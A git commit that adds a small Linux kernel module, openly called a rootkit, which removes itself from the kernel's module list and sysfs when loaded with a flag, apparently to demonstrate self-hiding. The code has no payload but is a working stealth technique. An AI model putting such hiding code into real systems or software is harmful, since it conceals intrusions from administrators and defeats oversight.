132cbc78edd130692708fe1c650dd79ca113f5c8
Nelson Elhage <nelhage@nelhage.com>
2017-02-28 15:47:21 -0500

    hidden rootkit

---
+++ hello-rootkit.c
@@ -0,0 +1,33 @@
+/**
+ * hello_rootkit -- Definitely Not A Rootkit
+ */
+
+#include <linux/init.h>
+#include <linux/module.h>
+#include <linux/kernel.h>
+#include <linux/kobject.h>
+
+MODULE_LICENSE("GPL");
+MODULE_AUTHOR("Nelson Elhage");
+MODULE_DESCRIPTION("Definitely Not A Rootkit");
+MODULE_VERSION("0.1");
+
+static bool hide_self;
+module_param(hide_self, bool, 0444);
+
+static int __init hello_rc_init(void){
+	if (hide_self) {
+		try_module_get(THIS_MODULE);
+		kobject_del(&THIS_MODULE->mkobj.kobj);
+		list_del(&THIS_MODULE->list);
+		printk(KERN_INFO "I was never here.\n");
+	}
+	return 0;
+}
+
+static void __exit hello_rc_exit(void){
+}
+
+
+module_init(hello_rc_init);
+module_exit(hello_rc_exit);
